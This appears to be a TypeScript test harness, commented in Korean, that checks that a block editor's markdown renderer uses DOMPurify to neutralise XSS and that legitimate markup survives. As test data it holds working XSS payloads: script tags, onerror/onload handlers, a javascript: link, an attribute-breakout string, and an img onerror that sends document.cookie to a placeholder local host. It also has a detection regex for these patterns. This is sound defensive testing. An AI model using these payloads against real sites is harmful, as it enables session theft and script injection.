/**
 * BUG-20260826-01 L1 — 마크다운 새니타이즈 하네스 (T1)
 *
 * 결함: `renderBlockToHtml` 이 `resolveAssetPaths(html)` 를 그대로
 *       `dangerouslySetInnerHTML` 에 흘려보내 raw HTML/스크립트가 실행된다
 *       (DEBUG_PLAN.md §1.1 실측 5벡터). DOMPurify 로 감싸서 막는다.
 * 처방: `renderBlockToHtml` (project/src/widgets/BlockEditor/ui/ReadView.tsx)
 *
 * DOMPurify 는 브라우저(window/document)가 있어야 동작하므로, ReadView 를
 * 임포트하기 전에 jsdom window 를 전역에 심어 둔다(dompurify 는 모듈 로드
 * 시점에 `typeof window` 로 지원 여부를 결정한다 — 나중에 심으면 늦는다).
 *
 * 실행: node --import ./scripts/register-ts.mjs src/widgets/BlockEditor/__tests__/sanitizer_harness.ts
 */
import { test } from 'node:test';
import assert from 'node:assert';
import { JSDOM } from 'jsdom';

const dom = new JSDOM('<!doctype html><html><body></body></html>', { url: 'http://localhost/' });
(globalThis as unknown as { window: typeof dom.window }).window = dom.window;

const { renderBlockToHtml } = await import('../ui/ReadView.tsx');

// DEBUG_PLAN.md §1.1 — 실측된 5개 라이브 벡터
const VECTORS: Record<string, string> = {
  'raw script tag': '<script>alert(1)</script>',
  'img onerror': '<img src=x onerror="fetch(\'http://127.0.0.1:9/\'+document.cookie)">',
  'svg onload': '<p><svg onload=alert(1)></svg></p>',
  'mark injection': '<p><mark><img src=x onerror=alert(1)></mark></p>',
  'md link javascript:': '[click](javascript:alert(1))',
};

const DANGER_PATTERN = /on\w+\s*=|<script|javascript:/i;

test('BUG-20260826-01 L1 — DOMPurify 가 실측 5벡터를 전부 무력화한다', async (t) => {
  for (const [name, payload] of Object.entries(VECTORS)) {
    await t.test(`S1: ${name}`, () => {
      const html = renderBlockToHtml(payload, null);
      assert.doesNotMatch(
        html,
        DANGER_PATTERN,
        `벡터 "${name}" 가 새니타이즈를 통과했다: ${html}`,
      );
    });
  }
});

test('BUG-20260826-01 L1 — data-code 속성 이스케이프가 escapeHtml 로 일원화됐다', async (t) => {
  await t.test('S1-attr: 코드펜스 안에 " 와 < 가 있어도 속성 이탈이 발생하지 않는다', () => {
    const codeText = '"><img src=x onerror=alert(1)>';
    const html = renderBlockToHtml('```\n' + codeText + '\n```', null);
    const doc = new dom.window.DOMParser().parseFromString(html, 'text/html');
    const btn = doc.querySelector('.rv-copy-btn');
    assert.ok(btn, 'copy 버튼을 찾지 못함');
    // 이탈이 성공했다면 onerror 속성이 버튼에 실제로 붙는다 — 텍스트 내 "onerror=" 문자열
    // 존재 여부가 아니라 DOM 파싱 결과의 속성 목록으로 판정해야 한다.
    assert.equal(btn!.getAttribute('onerror'), null, '속성 이탈로 onerror 속성이 실제로 부착됨');
    // 값이 원본과 정확히 왕복되어야 손상(이스케이프 중복/누락) 없이 이탈만 막혔다고 확인된다.
    assert.equal(btn!.getAttribute('data-code'), codeText);
  });

  await t.test('S1-attr: & 가 escapeHtml 경로로 통일되어 두 벌 이스케이프가 남지 않는다', () => {
    const codeText = 'A & B < C';
    const html = renderBlockToHtml('```\n' + codeText + '\n```', null);
    const doc = new dom.window.DOMParser().parseFromString(html, 'text/html');
    const btn = doc.querySelector('.rv-copy-btn');
    assert.ok(btn);
    assert.equal(btn!.getAttribute('data-code'), codeText, '& 처리 누락으로 값이 원본과 달라짐');
  });
});

test('BUG-20260826-01 L1-역방향 — 정상 마크업은 과잉 제거되지 않는다', async (t) => {
  await t.test('S1-역: <mark> 하이라이트는 살아남는다', () => {
    const html = renderBlockToHtml('==하이라이트==', null);
    assert.match(html, /<mark>하이라이트<\/mark>/);
  });

  await t.test('S1-역: 코드블록 하이라이트 마크업이 살아남는다', () => {
    const html = renderBlockToHtml('```js\nconst x = 1;\n```', null);
    assert.match(html, /class="hljs/);
    assert.match(html, /rv-copy-btn/);
  });

  await t.test('S1-역: 이미지 alt/src 가 살아남는다', () => {
    const html = renderBlockToHtml('![alt text](pic.png)', null);
    assert.match(html, /<img src="pic\.png" alt="alt text">/);
  });

  await t.test('S1-역: 일반 링크는 살아남는다', () => {
    const html = renderBlockToHtml('[click](https://example.com)', null);
    assert.match(html, /href="https:\/\/example\.com"/);
  });
});
